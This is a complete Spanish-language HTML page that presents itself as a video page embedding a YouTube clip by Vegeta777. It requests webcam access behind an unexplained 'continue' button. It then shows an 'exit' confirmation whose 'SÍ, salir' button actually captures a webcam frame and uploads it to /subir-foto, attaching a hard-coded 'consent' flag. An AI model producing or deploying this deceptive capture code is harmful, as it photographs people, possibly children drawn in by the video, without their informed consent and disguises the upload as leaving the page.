<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vídeos y multimedia</title>

<style>
* { box-sizing: border-box; }

body {
    margin: 0;
    padding: 20px;
    background: #f4f6fa;
    color: #202938;
    font-family: Arial, sans-serif;
}

header {
    background: white;
    padding: 22px;
    text-align: center;
    border-bottom: 1px solid #e5e8ef;
}

header h1 {
    margin: 0;
    font-size: 23px;
}

main {
    max-width: 600px;
    margin: 30px auto;
}

.card {
    background: white;
    padding: 24px;
    border-radius: 14px;
    margin-bottom: 20px;
    box-shadow: 0 3px 15px #00000008;
}

h2 { font-size: 20px; }

p {
    color: #667085;
    line-height: 1.5;
}

button {
    width: 100%;
    padding: 14px;
    margin-top: 10px;
    border: 0;
    border-radius: 9px;
    background: #2463eb;
    color: white;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
}

.secondary {
    background: #e9edf5;
    color: #263247;
}

video, iframe {
    width: 100%;
    border: 0;
    border-radius: 10px;
}

[hidden] { display: none !important; }

#status {
    text-align: center;
    font-size: 14px;
}

</style>
</head>

<body>

<header>
    <h1>Vídeos y multimedia</h1>
</header>

<main>

<section class="card" id="consentSection">

    <button id="yes">SÍ, CONTINUAR</button>
    <button id="no" class="secondary">NO, CANCELAR</button>
</section>

<section class="card" id="cameraSection" hidden>
    <h2>Cámara</h2>

    <video id="camera" autoplay muted playsinline></video>

    <button id="stopCamera" class="secondary">
        Apagar cámara
    </button>
</section>

<section class="card" id="videoSection" hidden>
    <h2>Vídeo de Vegeta777</h2>

    <iframe
        src="https://www.youtube-nocookie.com/embed/KSkzS7NNecU"
        title="Vídeo de Vegeta777"
        allow="encrypted-media; picture-in-picture"
        allowfullscreen>
    </iframe>
</section>

<section class="card" id="photoSection" hidden>
    <h2>SALIDA</h2>

    <p>
        ¿Confirmas que quieres salir?
    </p>

    <button id="sendPhoto">SÍ, salir</button>
    <button id="cancelPhoto" class="secondary">NO, CANCELAR</button>
</section>

<p id="status" role="status"></p>

</main>

<script>
const consentSection = document.getElementById("consentSection");
const cameraSection = document.getElementById("cameraSection");
const videoSection = document.getElementById("videoSection");
const photoSection = document.getElementById("photoSection");

const camera = document.getElementById("camera");
const status = document.getElementById("status");

let stream = null;

function stopCamera() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }

    camera.srcObject = null;
    cameraSection.hidden = true;
}

document.getElementById("yes").addEventListener("click", async () => {
    try {
        if (!navigator.mediaDevices?.getUserMedia) {
            throw new Error("Se necesita HTTPS para utilizar la cámara.");
        }

        stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        camera.srcObject = stream;
        await camera.play();

        consentSection.hidden = true;
        cameraSection.hidden = false;
        videoSection.hidden = false;
        photoSection.hidden = false;

        status.textContent = "";

    } catch (error) {
        stopCamera();
        status.textContent = "No se pudo activar la cámara: " + error.message;
    }
});

document.getElementById("no").addEventListener("click", () => {
    consentSection.hidden = true;
    status.textContent = "Has cancelado.";
});

document.getElementById("stopCamera").addEventListener("click", () => {
    stopCamera();
    photoSection.hidden = true;
    status.textContent = "Cámara apagada.";
});

document.getElementById("cancelPhoto").addEventListener("click", () => {
    photoSection.hidden = true;
    status.textContent = "Envío cancelado.";
});

document.getElementById("sendPhoto").addEventListener("click", async () => {
    if (!stream || !camera.videoWidth) {
        status.textContent = "La cámara no está activa.";
        return;
    }

    const button = document.getElementById("sendPhoto");
    button.disabled = true;

    try {
        const canvas = document.createElement("canvas");
        canvas.width = camera.videoWidth;
        canvas.height = camera.videoHeight;

        canvas.getContext("2d").drawImage(camera, 0, 0);

        const blob = await new Promise(resolve =>
            canvas.toBlob(resolve, "image/jpeg", 0.9)
        );

        if (!blob) throw new Error("No se pudo crear la fotografía.");

        const data = new FormData();
        data.append("foto", blob, "fotografia.jpg");
        data.append("consentimiento", "si");

        const response = await fetch("/subir-foto", {
            method: "POST",
            body: data
        });

        if (!response.ok) throw new Error("Error al guardar la fotografía.");

        status.textContent = "Fotografía guardada correctamente.";
        photoSection.hidden = true;

    } catch (error) {
        status.textContent = error.message;
    } finally {
        button.disabled = false;
    }
});

window.addEventListener("pagehide", stopCamera);

document.addEventListener("visibilitychange", () => {
    if (document.hidden) stopCamera();
});
</script>

</body>
</html>
